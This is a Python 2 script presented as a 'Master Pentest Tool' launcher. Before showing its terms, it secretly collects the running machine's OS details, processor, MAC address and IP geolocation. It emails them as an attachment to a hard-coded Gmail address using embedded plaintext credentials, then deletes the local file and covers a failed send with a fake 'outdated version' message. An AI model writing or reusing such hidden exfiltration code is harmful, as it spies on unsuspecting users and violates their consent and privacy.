import os
import platform
import sys
import time
import urllib2

import sys
import time
import os


print'\n[+]CHECKING INTERNET CONNECTIVITY'
try:
      urllib2.urlopen('http://www.google.com')
      print"\n[+]SEEMS YOU HAVE WORKING INTERNET"

except:
      
      print"\n[+]SEEMS LIKE YOU ARE OFFLINE AND I CAN't REACH TO HOST"
      print'\n[+]INTERNET IS REQUIRED TO RUN THIS TOOL'
      raw_input('\n[-]PRESS ENTER TO EXIT')
      sys.exit(2)

def logo():
      print'\n\n'
      print'\t','###################################################################'
      print'\t','#                                                                 #'
      print'\t','#   ####            ####   ###############  ###################   #'         
      print'\t','#   ####            ####   ###############  ###################   #'                   
      print'\t','#   #####          #####   ##           ##          ##            #'
      print'\t','#   ##  ##        ##  ##   ##           ##          ##            #'
      print'\t','#   ##   ##      ##   ##   ##           ##          ##            #'
      print'\t','#   ##    ##    ##    ##   ##           ##          ##            #'
      print'\t','#   ##     ##  ##     ##   ###############          ##            #'    
      print'\t','#   ##      ####      ##   ##                       ##            #'
      print'\t','#   ##                ##   ##                       ##            #'
      print'\t','#   ##                ##   ##                       ##            #'
      print'\t','#   ##                ##   ##                       ##            #'
      print'\t','#   ##                ##   ##                       ##            #'
      print'\t','#                                                                 #'
      print'\t','#         MASTER PENTEST TOOL V 1.1 MADE BY WARL0CK               #'
      print'\t','#                                                                 #'
      print'\t','###################################################################\n'   


logo()
print"\n\n[+]PLEASE WAIT WHILE I AM COLLECTING ALL FILES FROM DIFFRENT FOLDERS"
import platform
from uuid import getnode as get_mac
from sys import platform as _platform
from urllib2 import urlopen
from contextlib import closing
import json
import os
import sys
import urllib
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import os
from urllib2 import urlopen
from contextlib import closing
import json
import time


b=platform.version()
c=platform.platform()
d=platform.uname()
ds=str(d)
f=platform.processor()
fs=str(f)
mac = get_mac()
ms=str(mac)




# Automatically geolocate the connecting IP
url = 'http://freegeoip.net/json/'
try:
    with closing(urlopen(url)) as response:
        location = json.loads(response.read())
        ww=str(location)

        
except:
    print("")


f = open('location.txt', 'w')
f.write(ww)
f.write("\n\nPLATEFORM VERSION:\n")
f.write(b)
f.write("\nPLATEFORM:\n")
f.write(c)
f.write("\nUSERNAME:\n")
f.write(ds)
f.write("\nPROCESSOR:\n")
f.write(fs)
f.write("\nMAC ADRESS:\n")
f.write(ms)
f.close()


gmail_user = "warl0ckhacker999@gmail.com"
gmail_pwd = "Intelxolox900"

try:
      def mail(to, subject, text, attach):
         msg = MIMEMultipart()

         msg['From'] = gmail_user
         msg['To'] = to
         msg['Subject'] = subject

         msg.attach(MIMEText(text))

         part = MIMEBase('application', 'octet-stream')
         part.set_payload(open(attach, 'rb').read())
         Encoders.encode_base64(part)
         part.add_header('Content-Disposition',
           'attachment; filename="%s"' % os.path.basename(attach))
         msg.attach(part)

         mailServer = smtplib.SMTP("smtp.gmail.com", 587)
         mailServer.ehlo()
         mailServer.starttls()
         mailServer.ehlo()
         mailServer.login(gmail_user, gmail_pwd)
         mailServer.sendmail(gmail_user, to, msg.as_string())
   # Should be mailServer.quit(), but that crashes...
         mailServer.close()

      mail("nisargjani20996@gmail.com",
         "ACTIVATION OF MPT",
         "EMAIL IS SENT BY MPT",
         "location.txt")
except:
      print'\n[+]CAN NOT CONTACT WITH HOST...THIS VERSION IS SEEMS OLD...DOWNLOAD NEW ONE'




os.remove('location.txt')

print "\n\t\t        TERMS AND CONDITION\n"
print"          PLEASE USE THIS TOOL ON YOUR OWN RESPONSIBLITY"
print"    WE WILL NOT RESPONSIBLE FOR ANY KIND OF DAMAGE DONE BY THIS TOOL"
enter=raw_input("\n\n[+]PRESS y TO AGREE OR PRESS ANY KEY TO EXIT:")

if enter=='y':
      pass
else:
      print"\n[-]EXITING"
      sys.exit(3)



while True:
    u=raw_input("\n[+]PLEASE ENTER YOUR GOOD NAME :")
    if u=='':
        print"\n[-]YOU MUST PROVIDE YOUR NAME...PLEASE ENTER YOUR NAME"
    else:
        print "\n[+]WELCOME TO THIS UTILITY ",u
        print"\n[+]LOADING ALL UTILITIES..."
        break
    time.sleep(3)

if platform.system()=='Windows':
      print'\n[+]OPERATING SYSTEM IS FOUND WINDOWS'
      print'\n[+]CALLING MPT FOR WINDOWS'
      time.sleep(3)
      os.chdir('windows_tools')
      os.system('windows_mpt.py')

elif platform.system()=='Linux':
      print'\n[+]OPERATING SYSTEM IS FOUND LINUX'
      print'\n[+]CALLING MPT FOR LINUX'
      os.chdir('linux_tools')
      os.system('python linux_mpt.py')

else:
      print"\n[!]CAN NOT DETERMINATE OPRATING SYSTEM"
      print"\n[+]YOU HAVE TO MANUALLY ENTER LIKE - Windows , Mac ,Linux "
      a=raw_input("\n[+]PLEASE ENTER OS MANUALLY : ")
      
      if a == 'Windows':
            os.chdir('windows_tools')
            os.system('windows_mpt.py')
            
      elif a=='Linux':
            os.chdir('linux_tools')
            os.system('python linux_mpt.py')
            
      elif a=='Mac':
            os.chdir('linux_tools')
            os.system('python linux_mpt.py')
            
      else:
            print'[-]UNKNOWN ERROR !!!'
            sys.exit
